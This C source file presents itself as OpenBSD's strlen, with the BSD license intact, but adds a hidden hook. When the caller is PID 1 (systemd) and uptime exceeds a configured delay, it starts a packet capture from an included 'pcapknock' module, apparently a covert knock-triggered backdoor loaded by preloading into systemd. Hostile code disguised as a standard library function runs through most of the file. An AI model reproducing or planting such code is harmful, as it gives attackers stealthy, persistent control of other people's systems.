/*
 * memchr.c
 * OpenBSD's strlen
 * By J. Stuart McMurray
 * Created 20190325
 * Last Modified 20190325
 */

/*	$OpenBSD: strlen.c,v 1.9 2015/08/31 02:53:57 guenther Exp $	*/

/*-
 * Copyright (c) 1990, 1993
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Only build the function in if we'll need it */
#ifdef PRELOAD_SYSTEMD

#include "config.h"
#include "pcapknock.h"

#define BUFLEN 1024 /* Buffer length */

void start_after_delay();

/* started indicates we've already started a capture */
int started = 0;
pthread_mutex_t mtx; 

size_t
strlen(const char *str)
{
	const char *s;

        /* If we're systemd, see if we should start capturing */
        if (1 == getpid())
                start_after_delay();

	for (s = str; *s; ++s)
		;
	return (s - str);
}

/* start_after_delay sees if we're ready to start the capture and if so,
 * starts it. */
void
start_after_delay()
{
        FILE *fp;
        int uptime;
        int upsecs;
        int start;
        char buf[BUFLEN], *end_ptr;

        pthread_mutex_lock(&mtx);

        /* If we've already started, don't bother */
        if (started) {
                pthread_mutex_unlock(&mtx);
                return;
        }

        /* Get system uptime.  I'd love a better way */
        fp = fopen("/proc/uptime", "r");
        uptime = 0;
        if (fp != NULL) {
                if (buf == fgets(buf, sizeof(buf), fp)) {
                        upsecs = strtod(buf, &end_ptr);
                        if (buf != end_ptr)
                                uptime = (0 <= upsecs ? upsecs : 0);
                } 
                fclose(fp);
        }

        /* If we've been up long enough, start the capture */
        start = 0;
        if (PSWAIT < uptime) {
                started = 1;
                start = 1;
        }
        pthread_mutex_unlock(&mtx);
        if (start) {
                start_capture();
        }
}

#endif /* #ifdef PRELOAD_SYSTEMD */
